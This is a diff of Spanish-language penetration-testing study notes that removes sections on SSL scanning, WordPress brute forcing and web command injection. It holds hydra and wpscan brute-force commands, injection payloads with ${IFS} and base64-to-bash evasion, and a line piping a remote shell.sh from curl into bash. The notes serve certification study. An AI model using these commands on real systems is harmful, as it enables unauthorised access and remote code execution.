@@ -2,11 +2,9 @@
 ### Indice
 - [FTP (Fuerza bruta)](#exftp)
 - [SSH (Fuerza bruta)](#exssh)
-- [HTTP SSL](#exssl)
-- [Wordpress Credentials (XMRPC abusing)](#exwp)
 - [Reverse Shell](#shell)
 - [Experiencias con Reverse Shell](#exshell)
-- [Inyeccion comandos Web](#inyeccion_comandos)
+
  <a name="exftp"></a>
 ### FTP
  
@@ -19,21 +17,6 @@ Si aparece la version, se podría mirar algun exploit.
 <a name="exssh"></a>
  ### SSH
  Fuerza bruta: ``` hydra -l user -P passwords.txt ssh://172.17.0.2 -s 2222```
-
- <a name="exssl"></a>
-## HTTPS SSL
-  
- Ver vulnerabilidades en certificados SSL:
- ```sslscan google.com:443```  
- algunas maquinas son vulnerables a Heartbleed, lo que consigue hacer un dump de la memoria en la que podemos llegar a encontrar claves privadas, nombres de usuario, contraseñas...
-
-<a name="exwp"></a>
- ## Wordpress
- 
-Credenciales por fuerza bruta abusando de xmlrpc
- ```
- wpscan --url <ip> -U <usuario encontrado> -P /ruta/al/rockyou.txt
- ```
 
  ## Reverse, Bind, Forward Shells
  
@@ -83,31 +66,5 @@ o
 curl${IFS}<IP>/shell.sh|bash
 
 ${IFS} sería el espacio en bash
-```
-### Inyección de comandos WEB  
-
-hay varias maneras de inyectar comandos, por ejemplo en burpsuite. Si identificamos un campo, lugar donde creemos que se pueda inyectar comandos, aquí se listan varias opciones para hacerlo.  
-```
-$(comando)
-;comando
-;comando;
-;comando;#
-
-No todos los comandos funcionan, probar con: id, whoami, ps, ls ...
-```
-
-Si no nos permite espacios:  
-```
-Cambiamos el espacio por ${IFS} ejemplo:
-echo${IFS}hola${IFS}mundo
-```
-
-Conversión a base64 (para evitar el error con caracteres no permitidos, como el &)
-```
-# Bash B64 Ofuscated
-{echo,COMMAND_BASE64}|{base64,-d}|bash 
-echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash
-bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i} 
-echo COMMAND_BASE64 | base64 -d | bash 
 ```
 <a href="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/tree/main"> Menú Principal</a>
